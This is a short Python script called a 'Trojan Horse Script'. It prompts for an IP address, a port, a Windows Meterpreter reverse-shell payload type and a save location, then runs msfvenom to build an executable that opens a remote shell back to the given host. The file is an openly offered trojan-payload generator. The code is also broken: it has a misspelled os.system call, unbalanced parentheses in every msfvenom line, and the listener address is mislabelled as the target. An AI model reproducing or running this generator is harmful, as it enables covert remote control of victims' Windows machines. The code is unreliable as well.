import os
os.system("apt-get install figlet")
os.syste("clear")
print("Welcome to the Trojan Horse Script")

ip = raw_input("Enter the IP address of the target: ")
port = raw_input("Enter the port number to connect to: ")
print("""
windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_http
windows/meterpreter/reverse_https
""")
payload = raw_input("Enter the payload type: ")
kayıtyeri = raw_input("Enter the location to save the payload: ")
if(payload == "windows/meterpreter/reverse_tcp"):
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe > {}".format(ip, port, kayıtyeri)))
elif(payload == "windows/meterpreter/reverse_http"):
    os.system("msfvenom -p windows/meterpreter/reverse_http LHOST={} LPORT={} -f exe > {}".format(ip, port, kayıtyeri)))
elif(payload == "windows/meterpreter/reverse_https"):
    os.system("msfvenom -p windows/meterpreter/reverse_https LHOST={} LPORT={} -f exe > {}".format(ip, port, kayıtyeri)))
else:
    print("Invalid payload type selected.")
    exit(1)
 